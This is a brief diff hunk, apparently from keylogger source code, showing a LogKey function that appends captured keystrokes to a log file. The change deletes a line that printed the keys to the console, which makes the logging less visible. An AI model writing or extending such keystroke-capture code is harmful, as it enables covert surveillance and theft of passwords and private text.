@@ -20,8 +20,6 @@ const int DELAY = 5000;
 
 void LogKey(char* key)
 {
-    cout << key;
-
     ofstream keylogs(LOGS_FILE_PATH, ios_base::app);
     keylogs << key;
     keylogs.close();
